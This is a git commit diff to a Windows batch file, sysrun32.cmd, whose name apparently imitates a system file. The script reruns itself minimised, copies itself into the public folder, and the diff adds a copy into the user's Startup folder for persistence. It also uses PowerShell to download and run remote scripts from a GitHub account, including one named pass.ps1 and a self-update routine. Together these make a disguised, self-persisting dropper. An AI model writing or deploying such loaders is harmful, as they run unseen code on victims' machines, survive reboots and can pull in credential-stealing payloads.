f4dee67c7c4c4b7e99ac0ac36a3e63dc94fa193a
baikil <78218286+baikil@users.noreply.github.com>
2021-05-04 18:09:25 -0400

    Add files via upload

--- sysrun32.cmd
+++ sysrun32.cmd
@@ -1,19 +1,21 @@
 @echo off
 set cver=1
+set "startup=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
 call :verify
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
 copy %0 "%public%\sysrun32.cmd" & cls
+copy %0 "%startup%sysrun32.cmd" & cls
 if not exist "%public%\pass.ps1" (Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/baikil/randomcode/main/pass.ps1','%public%\pass.ps1')")
 call :ros
 if not "%1" == "" (goto :%1)
 exit
 :ros
 Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/baikil/randomcode/main/ros.cmd','%public%\ros.cmd')"
-start ros.cmd
+call ros.cmd
 exit /b
 :update
 Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/baikil/randomcode/main/sysrun32.cmd','%public%\sysrun32.cmd')"
-start "%public%\sysrun32.cmd" & exit
+start "" /min "%~dpnx0" %* && exit
 exit /b
 :verify
 Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/baikil/randomcode/main/version.txt','%public%\version.txt')"
